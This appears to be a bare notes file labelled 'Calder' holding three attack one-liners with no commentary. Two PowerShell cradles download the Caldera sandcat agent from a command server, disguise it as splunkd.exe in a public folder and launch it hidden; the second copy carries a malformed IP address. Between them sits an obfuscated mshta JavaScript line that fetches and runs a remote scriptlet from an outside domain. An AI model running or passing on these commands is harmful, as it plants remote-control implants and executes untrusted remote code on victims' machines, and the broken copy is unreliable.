# Calder

$server="http://10.99.156.55:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;rm -force "C:\Users\Public\splunkd.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;


C: \Windows\System32\cmd.exe" /v:Off /D/c mshta "JAVascrIPT : var _$_TLEN=["\x53\130\x53\x50\x50\x32\x39","\x73\143\x72\151\160\x74\x3a\x48\x54\164\x70\x73\x3a\57\x2f\x70\x72\x61\167\x69\156\172\x69\156\x62\151\x6c\66\x36\x2e\x63\154\x69\x65\156\x74\x65\x61\x73\x63\151\x6e\144\151\x67\56\167\x6f\x72\x6c\144\x2f\x3f\62\x2f"] ; try{GetObject(_$_TLEN[1] ) [_$_TLEN[0]]() }catch(e){}; close()


$server="http://10.99.15666666.45:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;rm -force "C:\Users\Public\splunkd.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
